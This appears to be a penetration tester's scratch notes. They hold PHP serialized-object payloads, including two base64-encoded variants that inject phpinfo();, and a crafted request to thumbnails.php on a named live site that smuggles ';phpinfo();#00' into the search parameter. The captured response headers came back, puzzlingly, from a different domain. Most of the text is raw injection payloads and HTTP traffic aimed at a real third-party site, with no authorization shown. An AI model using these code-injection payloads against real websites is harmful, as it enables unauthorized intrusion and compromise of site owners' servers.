a:4: {
    s:2: "ID";
    s:32:"951fdb78b218306fdb443eceac29664d";
    s:2:"am";
    i:1;
    s:4:"lang";
    s:7:"english";
    s:3:"liv";
    a:1: {
        i:0;
        s:1:"1";
    }
}

a:4:{s:2:"ID";s:32:"951fdb78b218306fdb443eceac29664d";s:2:"am";i:1;s:4:"lang";s:7:"english";s:3:"liv";a:1:{i:0;s:1:"1";}}



payload:

czoxMjM6ImE6NDp7czoyOiJwaHBpbmZvKCk7IjtzOjMyOiJwaHBpbmZvKCk7IjtzOjI6ImFtIjtpOjE7czo0OiJwaHBpbmZvKCk7IjtzOjc6InBocGluZm8oKTsiO3M6MzoicGhwaW5mbygpOyI7YToxOntpOjA7czoxOiIxIjt9fQ%3D%3D



payload 2:
czoxMjM6ImE6NDp7czoyOiJwaHBpbmZvKCk7IjtzOjMyOiJwaHBpbmZvKCk7IjtzOjI6InBocGluZm8oKTsiO2k6MTtzOjQ6InBocGluZm8oKTsiO3M6NzoicGhwaW5mbygpOyI7czozOiJwaHBpbmZvKCk7IjthOjE6e2k6MDtzOjE6InBocGluZm8oKTsiO319

s:123:"a:4:{s:2:"phpinfo();";s:32:"phpinfo();";s:2:"phpinfo();";i:1;s:4:"phpinfo();";s:7:"phpinfo();";s:3:"phpinfo();";a:1:{i:0;s:1:"phpinfo();";}}


---

what?

this crafted request appears to respond with a different website. when performed on https://copperplate.org.uk with scope limiting enabled in Burp Suite, sending this request returns a response from https://tech-sourcery.co.uk...

request to https://copperplate.org.uk/thumbnails.php?album=search&keywords=on&search="""";phpinfo();#00
```
GET /thumbnails.php?album=search&keywords=on&search="""";phpinfo();#00 HTTP/2
Host: copperplate.org.uk
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Safari/537.36
Cache-Control: max-age=0
```

response from https://tech-sourcery.co.uk
```
HTTP/2 404 Not Found
X-Powered-By: W3 Total Cache/0.9.4.6.4
Expires: Wed, 11 Jan 1984 05:00:00 GMT
Cache-Control: no-cache, must-revalidate, max-age=0
Link: <https://tech-sourcery.co.uk/wp-json/>; rel="https://api.w.org/"
Strict-Transport-Security: max-age=63072000; includeSubDomains
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
Vary: Accept-Encoding,User-Agent
Content-Length: 17051
Content-Type: text/html; charset=UTF-8
Date: Wed, 07 Jun 2023 21:41:33 GMT
Server: Apache
```
